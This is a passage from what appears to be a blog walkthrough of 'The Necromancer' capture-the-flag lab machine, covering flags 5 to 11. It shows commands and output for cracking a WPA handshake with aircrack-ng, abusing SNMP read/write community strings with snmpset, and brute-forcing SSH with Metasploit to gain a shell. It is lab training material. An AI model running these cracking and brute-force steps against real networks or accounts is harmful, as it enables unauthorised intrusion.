</code></p>

<p>So I tried a different method of sending the string by piping it to netcat and it worked:</p>

<p>```
echo blackmagic | nc -u 192.168.223.128 31337</p>

<p>As you chant the words, a hissing sound echoes from the ice walls.</p>

<p>The blue aura disappears from the cave entrance.</p>

<p>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.</p>

<p>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.</p>

<p>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.</p>

<p>Suddenly, you are attacked by a swarm of bats!</p>

<p>You aimlessly thrash at the air in front of you!</p>

<p>The bats continue their relentless attack, until&hellip;. silence.</p>

<p>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.</p>

<p>Looking towards one of the torches, you see something on the cave wall.</p>

<p>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.</p>

<p>/thenecromancerwillabsorbyoursoul</p>

<p>flag5{0766c36577af58e15545f099a3b15e60}
```</p>

<p>Flag #5: <strong>809472671</strong></p>

<h1>Flag #6 &ndash; Necromancer</h1>

<p>Went to the new path and found the necromancer and a flag!</p>

<p><img class="center" src="/images/pentest/necromancer/necromancer-fullpage.png" title="&lsquo;necromancer&rsquo; &lsquo;necromancer&rsquo;" ></p>

<p>Flag #6: <strong>1756462165</strong></p>

<h1>Flag #7 &ndash; Not your average SNMP walk</h1>

<p>The necromancer link points to another binary, but when I tried to run it I got an error:</p>

<p><code>
./necromancer
bash: ./necromancer: cannot execute binary file: Exec format error
</code></p>

<p>This file is not an executable:</p>

<p><code>
file necromancer
necromancer: bzip2 compressed data, block size = 900k
</code></p>

<p>From it I&rsquo;ve extracted a packet capture file:</p>

<p><code>
tar xjvf necromancer
necromancer.cap
</code></p>

<p>The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!</p>

<p>```
aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
Opening necromancer.cap
Read 2197 packets.</p>

<p>   #  BSSID              ESSID                     Encryption</p>

<p>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)</p>

<p>Choosing first network as target.</p>

<p>Opening necromancer.cap
Reading packets, please wait&hellip;</p>

<pre><code>                             Aircrack-ng 1.2 

  [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 

  Time left: 1 hour, 59 minutes, 23 seconds                  0.16%

                       KEY FOUND! [ death2all ]


  Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                   DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

  Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                   56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                   C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                   3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

  EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
</code></pre>

<p>```</p>

<p>Boom! It didn&rsquo;t take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we&rsquo;re looking at SNMP next. I selected <strong>snmp-check</strong> for the job of enumerating SNMP:</p>

<blockquote><p>snmp-check allows you to enumerate the SNMP devices and places the output in a very
human readable friendly format. It could  be  useful  for penetration testing or
systems monitoring.</p></blockquote>

<p>Used the cracked key as community string and got the following info:</p>

<p>```
snmp-check -c death2all 192.168.223.128
snmp-check v1.9 &ndash; SNMP enumerator
Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>

<p>[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community &lsquo;death2all&rsquo;</p>

<p>[*] System information:</p>

<p>  Host IP address               : 192.168.223.128
  Hostname                      : Fear the Necromancer!
  Description                   : You stand in front of a door.
  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
  Location                      : Locked &ndash; death2allrw!
  Uptime snmp                   : &ndash;
  Uptime system                 : &ndash;
  System date                   : &ndash;
```</p>

<p>Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, <strong>snmpwalk</strong></p>

<blockquote><p>snmpwalk  &ndash;  retrieve a subtree of management values using SNMP GETNEXT requests</p></blockquote>

<p><code>
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
</code></p>

<p>The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked &ndash; death2allrw!&rdquo;</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is <strong>snmpset</strong></p>

<blockquote><p>snmpset  is  an  SNMP application that uses the SNMP SET request to set
information on a network entity.  One or more object identifiers (OIDs)
must  be given as arguments on the command line.  A type and a value to
be set must accompany each object identifier.</p></blockquote>

<p><code>
snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
</code></p>

<p>We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let&rsquo;s walk again:</p>

<p><code>
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
</code></p>

<p>With the door unlocked, we have the flag and next destination..SSH!</p>

<p>Flag #7: <strong>demonslayer</strong></p>

<h1>Flag #8 &ndash; demonslayer</h1>

<p>The SSH on the machine is accepting password logins, so it&rsquo;s time for the bruteforce approach. I&rsquo;ve used the combination of demonslayer as username and rockyou.txt as wordlist.</p>

<p>```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > run</p>

<p>[+] 192.168.223.128:22 &ndash; Success: &lsquo;demonslayer:12345678&rsquo; &lsquo;uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 &rsquo;
[*] Command shell session 1 opened (192.168.223.129:43627 &ndash;> 192.168.223.128:22) at 2018-06-09 14:41:25 -0400
```</p>

<p>We&rsquo;ve found the password is <em>12345678</em> and have a shell on the box:</p>

<p>```
msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1&hellip;</p>

<p>whoami
demonslayer
pwd
/home/demonslayer
ls -alh
total 40
drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   359B May 11  2016 .login
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   218B May 11  2016 .profile
drwx&mdash;&mdash;&mdash;  2 demonslayer  demonslayer   512B May 11  2016 .ssh
-rw-r&mdash;r&mdash;  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt
```</p>

<p>Let&rsquo;s read that flag:</p>

<p>```
cat flag8.txt
You enter the Necromancer&rsquo;s Lair!</p>

<p>A stench of decay fills this place.</p>

<p>Jars filled with parts of creatures litter the bookshelves.</p>

<p>A fire with flames of green burns coldly in the distance.</p>

<p>Standing in the middle of the room with his back to you is the Necromancer.</p>

<p>In front of him lies a corpse, indistinguishable from any living creature you have seen before.</p>

<p>He holds a staff in one hand, and the flickering object in the other.</p>

<p>&ldquo;You are a fool to follow me here!  Do you not know who I am!&rdquo;</p>

<p>The necromancer turns to face you.  Dark words fill the air!</p>

<p>&ldquo;You are damned already my friend.  Now prepare for your own death!&rdquo;</p>

<p>Defend yourself!  Counter attack the Necromancer&rsquo;s spells at u777!
```</p>

<p>I&rsquo;ve tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn&rsquo;t installed, but nc was:</p>

<p>```
nc -u localhost 777</p>

<p><strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Where do the Black Robes practice magic of the Greater Path?<br/>
```</p>

<p>The battle is on! Seems we have to answer correctly, so I googled and found this on <a href="https://en.wikipedia.org/wiki/Tsurani">this Wikipedia page</a>:</p>

<blockquote><p>Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
Path.</p></blockquote>

<p>Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:</p>

<p>```
Where do the Black Robes practice magic of the Greater Path?  Kelewan</p>

<p>flag8{55a6af2ca3fee9f2fef81d20743bda2c}
```</p>

<p>Flag #8: <strong>Kelewan</strong></p>

<h1>Flag #9 &ndash; Lord of the 8th plane of hell</h1>

<p>```
<strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Who did Johann Faust VIII make a deal with?<br/>
```</p>

<p>Next quesch! I&rsquo;m proud to say I didn&rsquo;t need to google for this one :D</p>

<p>```
Who did Johann Faust VIII make a deal with?  Mephistopheles</p>

<p>flag9{713587e17e796209d1df4c9c2c2d2966}
```</p>

<p>The legend of Faust is well-known to me, and since you&rsquo;re reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.</p>

<p>Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I&rsquo;m having a nostalgic moment here!</p>

<p>Flag #9: <strong>Mephistopheles</strong></p>

<h1>Flag #10 &ndash; The Ninth Gate</h1>

<p>```
<strong> You only have 3 hitpoints left! </strong></p>

<p>Defend yourself from the Necromancer&rsquo;s Spells!</p>

<p>Who is tricked into passing the Ninth Gate?<br/>
```</p>

<p>Back to Google for this one and found the answer <a href="https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters">here</a>:</p>

<blockquote><p>Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake
for Prince Sameth) as the latter&rsquo;s avatar. He is roughly 100 years old. Motivated by an
all-consuming desire for immortality, he believes that if he frees Orannis, he will
become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.</p></blockquote>

<p>```
Who is tricked into passing the Ninth Gate?  Hedge</p>

<p>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}</p>

<p>A great flash of light knocks you to the ground; momentarily blinding you!</p>

<p>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.</p>

<p>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.</p>

<p>The room is silent.</p>

<p>You walk over to where the Necromancer once stood.</p>

<p>On the ground is a small vile.
```</p>

<p>Flag #10: <strong>Hedge</strong></p>

<h1>Flag #11 &ndash; The elixir of power</h1>

<p>A small vile on the ground..a hidden .smallvile file in demonslayer&rsquo;s home!</p>

<p>```
$ cat .smallvile</p>

<p>You pick up the small vile.</p>

<p>Inside of it you can see a green liquid.</p>

<p>Opening the vile releases a pleasant odour into the air.</p>

<p>You drink the elixir and feel a great power within your veins!
```</p>

<p>Immediately I thought of root privileges and looked at the sudo rights:</p>

<p>```
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:</p>

<pre><code>env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
</code></pre>

<p>User demonslayer may run the following commands on thenecromancer:</p>

<pre><code>(ALL) NOPASSWD: /bin/cat /root/flag11.txt
</code></pre>

<p>```</p>

<p>User demonslayer can read the 11th flag in root&rsquo;s home folder. Let&rsquo;s see the ending:</p>

<p>```
$ sudo /bin/cat /root/flag11.txt</p>

<p>Suddenly you feel dizzy and fall to the ground!</p>

<p>As you open your eyes you find yourself staring at a computer screen.</p>

<p>Congratulations!!! You have conquered&hellip;&hellip;</p>

<pre><code>      .                                                      .
    .n                   .                 .                  n.
</code></pre>

<p>  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    <strong>                         </strong>    dXb.     dXP     .Xb
9XXb.<em>       </em>.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb.<em>       </em>.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  <code>9XXXXXXXXXXXXXXXXXXXXX'~   ~</code>OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'</p>

<pre><code>`9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
    ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                    )b.  .dbo.dP'`v'`9b.odb.  .dX(
                  ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                 dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                 `'      9XXXXXX(   )XXXXXXP      `'
                          XXXX X.`v'.X XXXX
                          XP^X'`b   d'`X^XX
                          X. 9  `   '  P )X
                          `b  `       '  d'
                           `             '                       
                           THE NECROMANCER!
                             by  @xerubus

               flag11{42c35828545b926e79a36493938ab1b1}
</code></pre>

<p>Big shout out to Dook and Bull for being test bunnies.</p>

<p>Cheers OJ for the obfuscation help.</p>

<p>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.</p>

<p>&ldquo;=========================================&rdquo;
&ldquo;  xerubus (@xerubus) &ndash; www.mogozobo.com  &rdquo;
&ldquo;=========================================&rdquo;
```</p>

<p>Flag #11: <strong>hackergod</strong></p>

<p>The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!</p>

<p>Some special fortune cookie:</p>

<p>```</p>

<hr />

<p>/ M: Last I knew, I thought I had trapped \
| you for all eternity in an icy little   |
| place called Cania                      |
|                                         |
| H: Sorry, Hell froze over.              |
|                                         |
| M: How very witty. But it takes more    |
| than sharp wit to rule Hell, little     |
\ one. You must also&hellip;dress the part.    /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
